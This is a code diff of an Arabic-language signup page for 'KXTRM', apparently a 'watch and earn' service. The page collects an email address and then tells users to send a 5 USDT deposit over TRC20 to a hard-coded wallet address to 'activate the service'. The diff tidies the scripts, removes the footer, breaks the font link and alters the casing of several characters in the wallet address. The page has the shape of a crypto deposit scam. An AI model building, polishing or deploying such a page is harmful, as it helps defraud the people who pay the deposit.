@@ -8,7 +8,7 @@
     <!-- جلب خط Cairo الاحترافي من جوجل -->
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
-    <link href="https://googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://googleapis.com" rel="stylesheet">
 
     <style>
         body { 
@@ -189,7 +189,7 @@
         <div class="brand">KXTRM</div>
         <div class="subtitle">إنشاء حساب جديد للمتابعة وتشغيل الخدمة</div>
         
-        <div class="amount-tag">  الإيداع: 5.00 USDT</div>
+        <div class="amount-tag">الإيداع: 5.00 USDT</div>
 
         <form id="paymentForm">
             <!-- الخطوة الأولى: بداية الدخول -->
@@ -218,43 +218,41 @@
                 <div class="manual-deposit-box">
                     <p style="font-size: 14px; margin-bottom: 10px; color: #2f3542;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                     
-                    <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" class="crypto-address-input" readonly>
+                    <input type="text" value="THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP" id="cryptoAddress" class="crypto-address-input" readonly>
                     
-                    <button onclick="copyWalletAddress()" type="button" style="font-family: 'Cairo', sans-serif; padding: 8px 12px; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; margin-top: 12px; width: 100%;">نسخ عنوان المحفظة</button>
+                    <button onclick="copyWalletAddress()" type="button" style="font-family: 'Cairo', sans-serif; padding: 8px 12px; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; font-size: 12px; margin-top: 10px; width: 100%;">نسخ عنوان المحفظة</button>
                 </div>
             </div>
         </form>
-
-        <div class="footer-text">WATCH AND EARN USD</div>
     </div>
 
-<script>
-    function goToStep2() {
-        const usernameInput = document.getElementById('username').value;
-        if(usernameInput.trim() === "") {
-            alert("يرجى كتابة البريد الإلكتروني أولاً.");
-            return;
+    <script>
+        function goToStep2() {
+            const emailInput = document.getElementById('username').value;
+            if(!emailInput || !emailInput.includes('@')) {
+                alert("يرجى كتابة البريد الإلكتروني أولاً بشكل صحيح!");
+                return;
+            }
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
         }
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-    }
 
-    function copyWalletAddress() {
-        const copyText = document.getElementById("cryptoAddress");
-        
-        navigator.clipboard.writeText(copyText.value.trim()).then(() => {
-            alert("تم نسخ عنوان المحفظة بشكل سليم! قم بالتحويل من OKX أو أي محفظة أخرى على شبكة TRC20 بقيمة 5 USDT.");
-        }).catch(err => {
-            copyText.select();
-            copyText.setSelectionRange(0, 99999);
-            document.execCommand("copy");
-            alert("تم نسخ عنوان المحفظة!");
-        });
-    }
+        function copyWalletAddress() {
+            const copyText = document.getElementById("cryptoAddress");
+            
+            navigator.clipboard.writeText(copyText.value).then(() => {
+                alert("تم نسخ عنوان المحفظة بشكل سليم! قم بالتحويل من محفظتك.");
+            }).catch(err => {
+                copyText.select();
+                copyText.setSelectionRange(0, 99999);
+                document.execCommand("copy");
+                alert("تم نسخ عنوان المحفظة!");
+            });
+        }
 
-    function alertNoAccount() {
-        alert("أنت لا تمتلك حساباً مسبقاً، يرجى كتابة بريدك الإلكتروني وإتمام الإيداع لتفعيل الخدمة.");
-    }
-</script>
+        function alertNoAccount() {
+            alert("يرجى كتابة بريدك الإلكتروني وإتمام الإيداع لتفعيل الخدمة.");
+        }
+    </script>
 </body>
 </html>
